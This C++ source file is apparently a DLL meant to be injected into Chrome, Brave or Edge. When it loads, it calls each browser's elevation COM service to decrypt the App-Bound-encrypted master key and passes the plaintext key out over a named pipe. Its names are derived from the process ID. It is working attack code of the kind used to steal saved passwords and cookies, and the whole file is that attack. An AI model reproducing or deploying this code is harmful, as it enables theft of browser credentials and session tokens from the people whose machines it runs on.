#include <algorithm>
#include <iomanip>
#include <optional>
#include <sstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wrl/client.h>
#include <filesystem>

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
    public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
    public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
    public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};
MIDL_INTERFACE("8F7B6792-784D-4047-845D-1782EFBEF205")
IEdgeElevator2Final : public IEdgeIntermediateElevator
{
    public:
    virtual HRESULT STDMETHODCALLTYPE RunIsolatedChrome(const WCHAR *, const WCHAR *, DWORD *, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE AcceptInvitation(const WCHAR *) = 0;
};

struct Config
{
    std::string name;
    CLSID clsid;
    IID iid;
    std::optional<IID> iid_v2;
};

static uint32_t rotl32(uint32_t x, int r)
{
    return (x << r) | (x >> (32 - r));
}

std::string PidToTag(DWORD pid)
{
    uint32_t c1 = 0xA5A5A5A5u;
    uint32_t c2 = 0x3C6EF372u;
    uint32_t c3 = 0x1BF5A7E1u;
    uint32_t c4 = 0x9E3779B9u;
    uint32_t w1 = rotl32(pid ^ c1, 5);
    uint32_t w2 = rotl32(pid ^ c2, 11);
    uint32_t w3 = rotl32(pid ^ c3, 17);
    uint32_t w4 = rotl32(pid ^ c4, 23);
    char buf[33];
    std::snprintf(buf, sizeof(buf), "%08X%08X%08X%08X", w1, w2, w3, w4);
    return std::string(buf);
}

HANDLE ConnectToPipe(std::string pipeName)
{
    if (!WaitNamedPipeA(pipeName.c_str(), 5000))
        throw std::runtime_error("WaitNamedPipeA timeout");
    HANDLE hPipe = CreateFileA(
        pipeName.c_str(),
        GENERIC_READ | GENERIC_WRITE,  
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );
    if (hPipe == INVALID_HANDLE_VALUE)
        throw std::runtime_error("CreateFileA failed: " + std::to_string(GetLastError()));
    return hPipe;
}

std::vector<uint8_t> RecieveEncryptedKey(HANDLE hPipe)
{
    DWORD bytesRead = 0;
    uint32_t length = 0;
    if (!ReadFile(hPipe, &length, sizeof(length), &bytesRead, nullptr) ||
        bytesRead != sizeof(length))
    {
        throw std::runtime_error("Failed to read length prefix: " +
                                 std::to_string(GetLastError()));
    }
    std::vector<uint8_t> buffer(length);
    if (!ReadFile(hPipe, buffer.data(), length, &bytesRead, nullptr) ||
        bytesRead != length)
    {
        throw std::runtime_error("Failed to read payload: " +
                                 std::to_string(GetLastError()));
    }
    return buffer;
}

void SendDecryptedKey(HANDLE hPipe, const std::string& hex)
{
    DWORD bytesWritten = 0;
    if (!WriteFile(hPipe, hex.c_str(),
                   static_cast<DWORD>(hex.size()),
                   &bytesWritten, nullptr) ||
        bytesWritten != hex.size())
    {
        throw std::runtime_error("Failed to write response: " +
                                 std::to_string(GetLastError()));
    }
}

Config GetCurrentBrowserConfig()
{
    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string processName = fs::path(exePath).filename().string();
    std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
    if(processName == "chrome.exe")
    {
        return { "Chrome", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}};
    }
    if(processName == "brave.exe")
    {
        return {"Brave", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}};
    }
    if(processName == "msedge.exe")
    {
        return {"Edge", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, IID{0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}}};
    }
    throw std::runtime_error("Unsupported host process: " + processName);
}

std::vector<uint8_t> DecryptKey(std::vector<uint8_t> encryptedKey)
{
    Config config = GetCurrentBrowserConfig();
    BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKey.data()), (UINT)encryptedKey.size());
    auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);
    BSTR bstrPlainKey = nullptr;
    auto bstrPlainGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(nullptr, &SysFreeString);
    DWORD comErr = 0;
    HRESULT hr = E_FAIL;
    if (config.name == "Edge")
    {
        if (config.iid_v2.has_value())
        {
            Microsoft::WRL::ComPtr<IEdgeElevator2Final> elevator2;
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid_v2.value(), &elevator2);
            if (SUCCEEDED(hr))
            {
                CoSetProxyBlanket(elevator2.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                hr = elevator2->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
        }
        if (!config.iid_v2.has_value() || hr == E_NOINTERFACE || FAILED(hr))
        {
            Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
            if (SUCCEEDED(hr))
            {
                CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
        }
    }
    else
    {
        Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
        if (config.iid_v2.has_value())
        {
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid_v2.value(), &elevator);
        }
        if (!config.iid_v2.has_value() || hr == E_NOINTERFACE || FAILED(hr))
        {
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
        }
        if (SUCCEEDED(hr))
        {
            CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
            hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
        }
    }
    if (FAILED(hr))
        throw std::runtime_error("DecryptData failed: " + std::to_string(hr));
    bstrPlainGuard.reset(bstrPlainKey);
    UINT len = SysStringByteLen(bstrPlainKey);
    std::vector<uint8_t> aesKey(len);
    memcpy(aesKey.data(), bstrPlainKey, len);
    return aesKey;
}


std::string BytesToHexString(const std::vector<uint8_t> &bytes)
{
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (uint8_t byte : bytes)
        oss << std::setw(2) << static_cast<int>(byte);
    return oss.str();
}

DWORD WINAPI DecryptThread(LPVOID)
{
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    auto pipeName = R"(\\.\pipe\)" + PidToTag(GetCurrentProcessId());
    HANDLE hPipe = ConnectToPipe(pipeName);
    auto encryptedKey = RecieveEncryptedKey(hPipe);
    auto key = DecryptKey(encryptedKey);
    auto hexKey = BytesToHexString(key);
    SendDecryptedKey(hPipe, hexKey);
    CloseHandle(hPipe);
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(nullptr, 0, DecryptThread, nullptr, 0, nullptr);
        if (hThread)
            CloseHandle(hThread);
    }
    return TRUE;
}
